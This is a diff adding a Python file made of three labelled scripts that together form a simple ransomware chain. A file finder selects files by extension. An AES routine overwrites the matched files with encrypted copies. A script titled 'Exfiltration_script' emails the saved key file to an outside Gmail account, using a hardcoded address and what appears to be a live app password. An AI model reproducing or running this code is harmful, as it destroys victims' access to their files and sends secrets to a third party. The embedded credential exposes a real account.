@@ -1,0 +1,145 @@
+#File_Search_script
+import os
+
+def find_files(directory, extensions):
+    found_files = []
+    for dirpath, _, filenames in os.walk(directory):
+        for filename in filenames:
+            if any(filename.endswith(ext) for ext in extensions):
+                found_files.append(os.path.join(dirpath, filename))
+    return found_files
+
+def log_found_files(files, log_file):
+    with open(log_file, 'w') as f:
+        for file in files:
+            f.write(f"{file}\n")
+
+def main():
+    directory = input("Enter the directory to search: ")
+    extensions = input("Enter the file extensions to search for (comma-separated, e.g., .txt,.docx,.jpg): ").split(',')
+
+    # Clean up extensions
+    extensions = [ext.strip() for ext in extensions]
+
+    found_files = find_files(directory, extensions)
+    log_found_files(found_files, 'files.log')
+
+    print(f"Found {len(found_files)} files. List saved to 'files.log'.")
+
+if __name__ == "__main__":
+    main()
+
+
+
+#Aes_encryption_script
+import os
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
+from Crypto.Util.Padding import pad, unpad
+
+def generate_key():
+    return get_random_bytes(16)  # AES-128
+
+def save_key(key, filename='key.bin'):
+    with open(filename, 'wb') as key_file:
+        key_file.write(key)
+
+def encrypt_file(file_path, key):
+    cipher = AES.new(key, AES.MODE_CBC)
+    with open(file_path, 'rb') as f:
+        plaintext = f.read()
+    
+    # Pad plaintext to be multiple of block size
+    padded_data = pad(plaintext, AES.block_size)
+    iv = cipher.iv  # Initialization vector
+    ciphertext = cipher.encrypt(padded_data)
+    
+    # Write IV and ciphertext to the original file (overwriting it)
+    with open(file_path, 'wb') as f:
+        f.write(iv + ciphertext)
+
+def find_files(directory, extensions):
+    found_files = []
+    for root, dirs, files in os.walk(directory):
+        for file in files:
+            if any(file.endswith(ext) for ext in extensions):
+                found_files.append(os.path.join(root, file))
+    return found_files
+
+def main():
+    directory = input("Enter the directory to search: ")
+    extensions = input("Enter file extensions to search for (comma-separated, e.g., .txt,.docx,.jpg): ")
+    extensions = [ext.strip() for ext in extensions.split(',')]
+    
+    found_files = find_files(directory, extensions)
+    
+    if not found_files:
+        print("No files found with the specified extensions.")
+        return
+    
+    key = generate_key()
+    save_key(key)
+
+    for file in found_files:
+        encrypt_file(file, key)
+        print(f"Encrypted: {file}")
+
+    print(f"Encryption key saved to 'key.bin'.")
+
+if __name__ == "__main__":
+    main()
+
+
+
+#Exfiltration_script
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+import os
+
+def send_email_with_attachment(subject, body, to_email, file_path):
+    from_email = "ziad.choucha1@gmail.com"
+    password = "cdtb ntkr dqpu cdmx"  # This should be your Gmail App Password
+
+    msg = MIMEMultipart()
+    msg["Subject"] = subject
+    msg["From"] = from_email
+    msg["To"] = to_email
+
+    msg.attach(MIMEText(body, "plain"))
+
+    print(f"Looking for file at: {file_path}")
+    if os.path.isfile(file_path):
+        with open(file_path, "rb") as file:
+            part = MIMEBase("application", "octet-stream")
+            part.set_payload(file.read())
+            encoders.encode_base64(part)
+            part.add_header(
+                "Content-Disposition",
+                f"attachment; filename={os.path.basename(file_path)}"
+            )
+            msg.attach(part)
+    else:
+        print("Attachment file not found.")
+        return
+
+    try:
+        with smtplib.SMTP("smtp.gmail.com", 587) as server:
+            server.ehlo()
+            server.starttls()
+            server.ehlo()
+            server.login(from_email, password)
+            server.send_message(msg)
+        print("Email with attachment sent successfully!")
+    except Exception as e:
+        print(f"Error: {e}")
+
+# Run it
+send_email_with_attachment(
+    "Here is your file",
+    "Hi, here is the file attached.",
+    "ziad.choucha1@gmail.com",
+    r"C:\Users\Ziad\Desktop\test\key.bin"
+)
